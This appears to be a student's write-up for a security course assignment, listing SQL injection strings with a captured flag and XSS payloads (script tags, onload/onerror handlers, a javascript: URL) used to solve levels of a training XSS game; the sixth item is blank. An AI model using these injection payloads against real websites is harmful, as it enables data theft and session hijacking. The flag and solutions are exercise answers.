# Crypto II Writeup

Name: Adhithya Kannan
Section: 0101

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: Adhithya Kannan

## Assignment Writeup

### Part 1 (40 Pts)


> or 1-- -' or 1 or '1"or 1 or"
> code below is the sql injection, above is actual sql code
> || 0x50-- -' || 0x50 || '0x50"|| 0x50 ||"

CMSC389R-{y0u_ar3_th3_SQ1_ninj@}

### Part 2 (60 Pts)

1) used script tag <script>alert()</script>
2) used img tag <img src="https://xss-game.appspot.com/static/level2_icon.png" onload="alert()"/>
3)used the on error funcion and created an error for it to load on
	https://xss-game.appspot.com/level3/frame#1' onerror='alert(1)';
4)created the alert function within backwards parenthesis
	https://xss-game.appspot.com/level4/frametimer=');alert('xss
5) changed confirm to next=javascript:alert() and then typed in email
	https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()
6)
